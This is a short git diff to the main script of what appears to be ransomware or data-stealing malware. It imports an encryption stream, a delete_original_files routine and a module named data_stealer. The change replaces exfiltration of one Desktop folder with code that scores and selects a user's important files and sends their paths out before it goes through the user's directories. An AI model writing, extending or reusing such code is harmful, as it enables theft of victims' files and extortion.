@@ -3,7 +3,8 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from crypto.encrypt import SecureFileCryptoStream
 from software_gui import run_gui
-from server.data_stealer import send_files
+from server.data_stealer import send_files_using_path, send_files_using_selected_files_from_get_importent
+from server.get_importent_files import get_selected_files
 
 crypto = SecureFileCryptoStream()
 
@@ -62,11 +63,24 @@ def delete_original_files():
 
 def main():
 
-    PATHS = [
-        Path.home() / "Desktop" / "myapp"#,   
-    ]
+    #
+    #. SEND LOGIC
+    #------ for folder with structure
+    # PATHS = [
+    #     Path.home() / "Desktop" / "myapp"#,   
+    # ]
 
-    send_files(PATHS)
+    # send_files(PATHS)
+
+    #------all importent files with score
+
+    files = get_selected_files()
+
+    clean_paths = [f["path"] for f in files]
+
+    send_files_using_path(clean_paths)
+
+    #-----------------------------------------------
 
     directories = get_user_dirs()
 
